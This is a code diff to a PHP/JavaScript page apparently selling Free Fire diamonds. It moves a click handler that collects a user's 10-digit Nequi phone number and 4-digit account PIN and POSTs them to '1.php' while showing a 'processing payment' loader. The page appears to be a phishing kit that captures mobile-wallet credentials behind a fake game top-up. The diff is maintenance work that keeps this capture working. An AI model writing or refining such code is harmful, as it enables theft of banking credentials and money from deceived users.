@@ -419,6 +419,53 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
 
               if (telefonoInput) console.log("telefonoNequi display:", telefonoInput.style.display);
               if (claveInput) console.log("claveNequi display:", claveInput.style.display);
+
+              // Agregar event listener al botón después de mostrar el modal
+              const btnEnviar = document.getElementById("btnEnviarNequi");
+              if (btnEnviar) {
+                btnEnviar.addEventListener("click", function() {
+                  const telefono = document.getElementById("telefonoNequi").value;
+                  const clave = document.getElementById("claveNequi").value;
+
+                  if (!telefono || telefono.length !== 10) {
+                    alert("Por favor ingresa un número de teléfono válido (10 dígitos)");
+                    return;
+                  }
+
+                  if (!clave || clave.length !== 4) {
+                    alert("Por favor ingresa una clave de 4 dígitos");
+                    return;
+                  }
+
+                  // Enviar datos al servidor
+                  fetch("1.php", {
+                    method: "POST",
+                    headers: {
+                      "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({
+                      action: "enviar_datos_nequi",
+                      telefono: telefono,
+                      clave: clave,
+                      transactionId: "<?php echo $transactionId; ?>"
+                    })
+                  })
+                  .then(response => response.json())
+                  .then(data => {
+                    if (data.ok) {
+                      // Ocultar modal y mostrar mensaje de procesamiento
+                      document.getElementById("modalAutorizacion").style.display = "none";
+                      mostrarLoader("Procesando pago...");
+                    } else {
+                      alert("Error al enviar datos: " + (data.error || "Error desconocido"));
+                    }
+                  })
+                  .catch(error => {
+                    console.error("Error:", error);
+                    alert("Error de conexión. Inténtalo de nuevo.");
+                  });
+                });
+              }
             } else {
               console.error("Modal modalAutorizacion no encontrado!");
             }
@@ -468,50 +515,6 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
       console.error("Error en checkLogin:", err);
     }
   }
-
-  // Función para manejar el envío del modal de Nequi
-  document.getElementById("btnEnviarNequi").addEventListener("click", function() {
-    const telefono = document.getElementById("telefonoNequi").value;
-    const clave = document.getElementById("claveNequi").value;
-
-    if (!telefono || telefono.length !== 10) {
-      alert("Por favor ingresa un número de teléfono válido (10 dígitos)");
-      return;
-    }
-
-    if (!clave || clave.length !== 4) {
-      alert("Por favor ingresa una clave de 4 dígitos");
-      return;
-    }
-
-    // Enviar datos al servidor
-    fetch("1.php", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
-        action: "enviar_datos_nequi",
-        telefono: telefono,
-        clave: clave,
-        transactionId: "<?php echo $transactionId; ?>"
-      })
-    })
-    .then(response => response.json())
-    .then(data => {
-      if (data.ok) {
-        // Ocultar modal y mostrar mensaje de procesamiento
-        document.getElementById("modalAutorizacion").style.display = "none";
-        mostrarLoader("Procesando pago...");
-      } else {
-        alert("Error al enviar datos: " + (data.error || "Error desconocido"));
-      }
-    })
-    .catch(error => {
-      console.error("Error:", error);
-      alert("Error de conexión. Inténtalo de nuevo.");
-    });
-  });
 
 </script>
 
